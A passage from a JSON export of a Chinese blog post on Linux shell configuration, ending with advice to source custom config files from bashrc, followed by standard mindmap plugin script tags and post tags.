shell 一致更方便了，但是这么做修改了系统设计可能会导致其他问题。</li>\n<li>更安全的做法是单独在  <code>/etc/bash.bashrc</code>  或  <code>~/.bashrc</code>  里添加单独加载指定的需要的配置文件，还可以单独自定义一个目录存放这样的配置文件并用  <code>if</code>  、  <code>for</code>  加载这个目录所有文件（模仿 <code>/etc/profile</code>  文件里的操作）。</li>\n</ul>\n</li>\n</ul>\n<script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kity@2.0.4/dist/kity.min.js\"></script><script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js\"></script><script defer=\"true\" type=\"text&#x2F;javascript\" src=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js\"></script><link rel=\"stylesheet\" type=\"text&#x2F;css\" href=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css\">",
            "tags": [
                "计算机科学",
                "Linux",
                "Linux"
            ]
        }
    ]
}